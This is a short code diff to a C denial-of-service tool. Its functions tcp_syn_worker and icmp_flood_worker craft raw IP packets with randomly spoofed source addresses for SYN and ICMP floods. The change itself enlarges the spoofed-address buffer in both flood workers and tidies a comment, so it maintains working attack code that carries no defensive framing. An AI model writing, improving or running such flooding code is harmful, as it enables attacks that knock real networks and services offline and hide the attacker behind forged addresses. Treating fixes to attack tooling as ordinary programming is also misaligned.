@@ -14,7 +14,7 @@
 #include <time.h>
 #include <errno.h>
 #include <curl/curl.h>
-#include <fcntl.h>  // Added for fcntl
+#include <fcntl.h>
 
 volatile int attack_active = 0;
 
@@ -142,8 +142,8 @@ void* tcp_syn_worker(void* arg) {
         iph->protocol = IPPROTO_TCP;
         iph->check = 0;
         
-        // Spoof source IP
-        char src_ip[16];
+        // Spoof source IP with larger buffer
+        char src_ip[20];  // Increased buffer size
         snprintf(src_ip, sizeof(src_ip), "%d.%d.%d.%d", 
                  rand()%256, rand()%256, rand()%256, rand()%256);
         iph->saddr = inet_addr(src_ip);
@@ -434,8 +434,8 @@ void* icmp_flood_worker(void* arg) {
         iph->ttl = 255;
         iph->protocol = IPPROTO_ICMP;
         
-        // Spoof source IP
-        char src_ip[16];
+        // Spoof source IP with larger buffer
+        char src_ip[20];  // Increased buffer size
         snprintf(src_ip, sizeof(src_ip), "%d.%d.%d.%d", 
                  rand()%256, rand()%256, rand()%256, rand()%256);
         iph->saddr = inet_addr(src_ip);
